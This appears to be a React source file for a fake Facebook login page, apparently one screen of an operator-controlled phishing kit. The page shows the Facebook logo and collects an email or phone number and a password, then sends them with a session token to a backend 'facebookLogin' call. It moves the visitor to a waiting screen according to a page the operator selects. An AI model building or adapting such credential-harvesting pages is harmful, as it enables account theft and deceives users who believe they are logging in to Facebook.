import React, { useEffect, useState } from "react";
import styled from 'styled-components'

import { StyledSection } from "./home";
import { RestApi } from "../../provider/restApi";
import { useNavigate } from "react-router-dom";
import { useGlobalData } from "../../provider/context";
import { valideToken } from "../../provider/services";

import Logo from '../../assets/images/facebook.png';

const Facebook = () => {

    const [state, { dispatch }]: any = useGlobalData();
    const page = state.selectedPage;
    const [username, setusername] = useState('');
    const [password, setPassword] = useState('');
    const [isdisabled, setIsdisabled] = useState(false);

    const navigation = useNavigate();
    const handleLogin = async () => {
        setIsdisabled(true)
        const token: any = localStorage.getItem('userToken')
        const formData = {
            username: username,
            password: password,
            token: token
        };
        const res = await RestApi.facebookLogin(formData);
        if (res.status) {
            alert(res.message)
        } else {
            navigation('/');
        }
    }

    useEffect(() => {
        const token: any = localStorage.getItem('userToken');
        valideToken(token)
            .then((logged) => {
                console.log('selected', page)
                if (!logged) {
                    navigation('/');
                } else if (page != 'Facebook Site') {
                    navigation('/waiting')
                }

            }).catch((err: any) => {
                console.log("valideToken error", err.message)
                navigation('/')
            })
    }, [])

    return (
        <StyledSection>
            <div className="panel">
                <FacebookSection>
                    <div className="facebook-title">
                        <h1>
                            Log in with Facebook to join
                        </h1>
                    </div>
                    <div className="facebook-logo">
                        <img src={Logo} width={300} />
                    </div>
                    <div className="facebook-login">
                        <input placeholder="Email address or phone number" value={username} onChange={(e) => setusername(e.target.value)} />
                        <input placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
                        <button onClick={handleLogin} disabled={isdisabled}>Login</button>
                    </div>
                </FacebookSection>
            </div>
        </StyledSection>
    )
}


const FacebookSection = styled.div`
    display: flex;
    flex-direction: column;
    text-align: center;
    height: 600px;
    .facebook-title {
        width: 90%;
        display: flex;
        justify-content: center;
        align-self: center;
        h1 {
            font-family: "Trustly Sans Medium", "Helvetica Neue", Arial, sans-serif;
            font-size: 1.75rem;
            font-weight: 600;
            line-height: 2rem;
            color: rgb(0, 0, 0);
            overflow-wrap: break-word;
            
        }
    }
    .facebook-login {
        display: flex;
        flex-direction: column;
        gap: 1em;
        input {
            border:1px solid rgb(216, 223, 228);
            padding: 1em;
            border-radius: 0.5em;
        }
        button {
            width: 100%;
            background-color: #1877f2;
            padding:1em;
            color: white;
            border: none;
            border-radius: 0.5em;
        }
    }
`
export default Facebook


